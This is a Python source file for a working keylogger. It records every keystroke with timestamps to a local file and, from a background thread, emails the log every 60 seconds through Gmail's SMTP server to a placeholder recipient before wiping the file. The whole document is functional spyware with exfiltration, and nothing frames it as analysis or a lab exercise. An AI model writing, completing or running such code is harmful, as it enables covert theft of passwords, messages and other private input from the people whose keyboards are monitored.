from pynput import keyboard
import smtplib, ssl
import datetime
import threading
import time

sender_mail = "user@domain.com"  # Replace with your email
receiver_mail = "user@domain.com"  # Replace with recipient email
password = "password"  # Replace with your email password or app password
port = 587
log_file = "keylogger.txt"
email_interval = 60  # Send email every 60 seconds
email_subject = "KeyLogs"
email_body_prefix = "Keylogs captured:\n\n"

def write(text):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(log_file, 'a') as f:
        f.write(f"[{timestamp}] {text}")

def send_email():
    global log_file, sender_mail, receiver_mail, password, port, email_subject, email_body_prefix
    while True:
        time.sleep(email_interval)
        try:
            with open(log_file, 'r') as f:
                log_content = f.read()

            message = f"""From: {sender_mail}
To: {receiver_mail}
Subject: {email_subject}

{email_body_prefix}{log_content}
"""

            context = ssl.create_default_context()
            with smtplib.SMTP('smtp.gmail.com', port) as server:
                server.starttls(context=context)
                server.login(sender_mail, password)
                server.sendmail(sender_mail, receiver_mail, message)
            print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Email Sent to {sender_mail}")

            # Clear the log file after sending (optional)
            with open(log_file, 'w') as f:
                f.write("")

        except Exception as e:
            print(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error sending email: {e}")

def on_key_press(Key):
    try:
        if Key == keyboard.Key.enter:
            write("\n")
        elif Key == keyboard.Key.space:
            write(" ")
        elif Key == keyboard.Key.tab:
            write("\t")
        elif hasattr(Key, 'char'):
            write(Key.char)
        else:
            write(f"[{str(Key)}] Pressed\n")
    except AttributeError:
        write(f"[{str(Key)}] Pressed (AttributeError)\n")

def on_key_release(Key):
    if Key == keyboard.Key.esc:
        return False

# Start the email sending thread
email_thread = threading.Thread(target=send_email)
email_thread.daemon = True  # Allow the main program to exit even if the thread is running
email_thread.start()

# Start the key listener
with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()

print("Keylogger stopped.")
